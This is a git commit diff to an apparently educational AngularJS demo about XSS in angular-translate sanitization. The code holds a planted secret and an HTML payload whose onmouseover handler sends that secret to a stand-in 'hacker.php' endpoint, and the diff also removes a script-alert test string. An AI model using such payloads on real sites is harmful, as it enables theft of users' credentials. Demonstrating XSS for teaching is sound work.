81f7d184558d8a6cdcb29086157cd7afb85d3fa8
Edward Ezekiel <ed.a.ezekiel@gmail.com>
2024-02-28 14:12:42 -0600

    feat(input): create form input to illustrate XSS

--- public/script.js
+++ public/script.js
@@ -1,19 +1,30 @@
-var translations = {
-  HEADLINE: '<script>alert(1)</script>',
-};
+var translations = {};
 
-var app = angular.module('myApp_sanitize', ['pascalprecht.translate', 'ngSanitize']);
+var app = angular.module('myApp_sanitize', [
+  'pascalprecht.translate',
+  'ngSanitize',
+]);
 
-app.config(['$translateProvider', function ($translateProvider) {
-  $translateProvider.translations('en', translations);
-  $translateProvider.preferredLanguage('en');
+app.config([
+  '$translateProvider',
+  function ($translateProvider) {
+    $translateProvider.translations('en', translations);
+    $translateProvider.preferredLanguage('en');
 
+    $translateProvider.useSanitizeValueStrategy('escape'); // works regardless
 
-  $translateProvider.useSanitizeValueStrategy('escape'); // works regardless
+    window.secretPassword = 'super-secret-password';
+  },
+]);
 
-  window.secretPassword = 'super-secret-password'
-}]);
+app.controller('Ctrl', [
+  '$scope',
+  function ($scope) {
+    $scope.input = '';
 
-app.controller('Ctrl', ['$scope', function ($scope) {
-  $scope.a = '<div onmouseover=\"javascript:fetch(\'hacker.php?password=\' + window.secretPassword);\">MOUSE OVER ME!</div>';
-}]);
+    function copyToClipboard() {
+      var str = `<div onmouseover="javascript:fetch('hacker.php?password=' + window.secretPassword);">MOUSE OVER ME!</div>`;
+      navigator.clipboard.writeText(str);
+    }
+  },
+]);
